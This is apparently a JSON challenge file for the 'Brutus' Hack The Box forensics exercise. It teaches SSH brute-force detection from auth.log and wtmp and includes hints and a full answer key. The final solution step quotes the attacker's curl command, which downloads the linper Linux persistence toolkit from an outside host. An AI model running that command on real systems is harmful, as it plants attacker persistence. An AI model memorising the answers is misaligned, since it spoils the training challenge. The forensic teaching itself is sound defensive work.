@@ -1,0 +1,99 @@
+{
+  "challengeId": "brutus",
+  "name": "Brutus",
+  "source": "sherlock",
+  "htbUrl": "https://app.hackthebox.com/sherlocks/Brutus",
+  "difficulty": "very_easy",
+  "estimatedTime": "1 hour",
+  "keyTakeaway": "Linux auth.log parsing — SSH brute-force detection, identifying successful logins, and tracking post-exploitation activity from authentication logs",
+  "tags": ["auth.log", "wtmp", "utmpdump", "SSH brute-force", "Linux forensics", "persistence", "T1136.001"],
+  "fundamentals": {
+    "content": "## Linux Authentication Log Analysis\n\n### Why auth.log Is Critical for Incident Response\n\nOn Linux systems, `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS) records every authentication event — SSH logins, sudo commands, user creation, and PAM module activity. It's the first place to look when investigating unauthorized access.\n\n### Key Patterns in auth.log\n\n| Pattern | Meaning |\n|---------|--------|\n| `Failed password for` | Failed login attempt (brute-force indicator) |\n| `Accepted password for` | Successful login |\n| `session opened for user` | User session started |\n| `session closed for user` | User session ended |\n| `useradd` | New user account created |\n| `usermod` | User account modified (e.g., added to groups) |\n| `sudo:` | Sudo command executed |\n\n### The wtmp Binary Log\n\n`/var/log/wtmp` is a binary file that records all login/logout events with session IDs and timestamps. Unlike auth.log (which is text), wtmp must be parsed with tools like `utmpdump` or the `last` command. It provides precise session durations that auth.log alone cannot.\n\n### Brute-Force Detection Pattern\n\nA brute-force attack shows:\n1. High volume of `Failed password` entries from a single IP\n2. Eventually an `Accepted password` entry from the same IP\n3. Post-exploitation activity (new users, sudo commands, tool downloads)",
+    "toolReferences": [
+      {
+        "tool": "grep / cut / sort",
+        "commands": [
+          "grep 'Failed password' auth.log | cut -d' ' -f11 | sort | uniq -c | sort -rn",
+          "grep 'Accepted password' auth.log",
+          "grep 'useradd' auth.log",
+          "grep 'sudo:' auth.log"
+        ]
+      },
+      {
+        "tool": "utmpdump / last",
+        "commands": [
+          "utmpdump wtmp (parse binary wtmp to readable format)",
+          "last -f wtmp (show login history with session info)"
+        ]
+      }
+    ]
+  },
+  "hints": {
+    "hints": [
+      "Start with auth.log — count failed password attempts per IP to identify the brute-force source.",
+      "After finding the attacker IP, look for 'Accepted password' entries from that same IP. There may be multiple successful logins — distinguish automated from manual by checking timestamps.",
+      "Use utmpdump on the wtmp file to get session numbers and precise login/logout timestamps. The session number maps directly to the PAM session ID in auth.log.",
+      "Look for 'useradd' entries to find persistence activity. The new user was also given elevated privileges — check for 'usermod' or group changes.",
+      "For the MITRE ATT&CK technique, creating a local account for persistence maps to a specific sub-technique under T1136.",
+      "Calculate session duration by subtracting the session open timestamp from the session close timestamp in auth.log.",
+      "The attacker used sudo to download a tool — grep for 'sudo:' entries from the backdoor account."
+    ]
+  },
+  "solution": {
+    "content": "## Full Walkthrough\n\n**Scenario:** A Confluence server was targeted with SSH brute-force attacks. You're provided with `auth.log` and `wtmp` files from the server.\n\n**Key Artifacts:**\n- `auth.log` — PAM authentication events (text)\n- `wtmp` — Login/logout session database (binary)",
+    "steps": [
+      {
+        "stepNumber": 1,
+        "description": "Identify the brute-force attacker IP",
+        "command": "grep 'Failed password' auth.log | cut -d' ' -f11 | sort | uniq -c | sort -rn",
+        "explanation": "Count failed password attempts per IP address. The IP `65.2.161.68` has an overwhelming number of failed attempts compared to other IPs, clearly indicating an automated brute-force attack. **Answer: `65.2.161.68`**"
+      },
+      {
+        "stepNumber": 2,
+        "description": "Find the compromised account",
+        "command": "grep 'Accepted password' auth.log",
+        "explanation": "Filter for successful logins. After hundreds of failed attempts, the attacker successfully authenticates as `root`. There are two successful logins from this IP — the first (06:31:40) is likely automated (part of the brute-force script), and the second (06:32:45) is the manual login. **Answer: `root`**"
+      },
+      {
+        "stepNumber": 3,
+        "description": "Determine the manual login timestamp",
+        "command": "utmpdump wtmp",
+        "explanation": "Parse the binary wtmp file to see login records with session IDs. The second successful login at `2024-03-06 06:32:45` is the attacker's manual session — this is when they sat down at the keyboard to carry out their objectives. **Answer: `2024-03-06 06:32:45`**"
+      },
+      {
+        "stepNumber": 4,
+        "description": "Find the session number",
+        "command": "utmpdump wtmp | grep '65.2.161.68'",
+        "explanation": "The wtmp output shows session numbers assigned to each login. The manual login session at 06:32:45 from the attacker IP was assigned session number `37`. **Answer: `37`**"
+      },
+      {
+        "stepNumber": 5,
+        "description": "Identify the persistence account",
+        "command": "grep 'useradd' auth.log",
+        "explanation": "The attacker created a new user `cyberjunkie` at 06:34:18 as a persistence mechanism. They also modified the account to grant elevated privileges. **Answer: `cyberjunkie`**"
+      },
+      {
+        "stepNumber": 6,
+        "description": "Map to MITRE ATT&CK",
+        "command": "MITRE ATT&CK: T1136.001 (Create Account: Local Account)",
+        "explanation": "Creating a local user account for persistence maps to MITRE ATT&CK sub-technique T1136.001. This is under the Persistence tactic — the attacker ensures they can return even if the original compromised credentials are changed. **Answer: `T1136.001`**"
+      },
+      {
+        "stepNumber": 7,
+        "description": "Calculate session duration",
+        "command": "grep 'session' auth.log | grep 'pam_unix(sshd:session)'",
+        "explanation": "The attacker's first SSH session opened at 06:32:45 and closed at 06:37:24. Duration: 06:37:24 - 06:32:45 = 279 seconds. **Answer: `279`**"
+      },
+      {
+        "stepNumber": 8,
+        "description": "Find the downloaded tool",
+        "command": "grep 'sudo:' auth.log | grep 'cyberjunkie'",
+        "explanation": "The attacker logged into their backdoor account and used sudo to download a persistence script: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`. The `linper` tool is a Linux persistence toolkit. **Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`**"
+      }
+    ]
+  },
+  "navigation": {
+    "previousChallengeId": null,
+    "nextChallengeId": "unit42"
+  }
+}
